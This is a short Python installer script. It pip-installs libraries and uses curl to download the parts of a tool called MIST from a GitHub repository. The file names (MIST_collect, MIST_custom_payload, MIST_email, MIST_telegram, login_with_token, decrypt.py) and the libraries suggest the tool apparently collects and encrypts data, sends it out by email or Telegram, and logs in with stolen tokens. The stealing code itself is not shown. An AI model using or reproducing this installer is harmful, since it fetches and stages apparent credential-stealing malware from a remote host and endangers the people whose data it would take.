import os

libs = ['shutil', 'regexp', 'json', 'base64', 'pypiwin32', 'pycryptodome', 'smtplib', 'cryptography', 'python-telegram-bot', 'asyncio', 'pyfiglet']


def install_lib(lib_name):
    os.system('pip install ' + lib_name)


os.system('mkdir MIST')


def download_file(filename):
    os.system(f'curl https://raw.githubusercontent.com/gh0stKn1ght/MIST/main/src/{filename} > .\\MIST\\{filename}')


files = ['MIST_collect', 'MIST_custom_payload', 'MIST_email', 'MIST_encryption', 'MIST_telegram', 'build.py', 'decrypt.py', 'launcher.py', 'login_with_token']


for lib in libs:
    install_lib(lib)

for file in files:
    download_file(file)

print('Successfully installed MIST!')
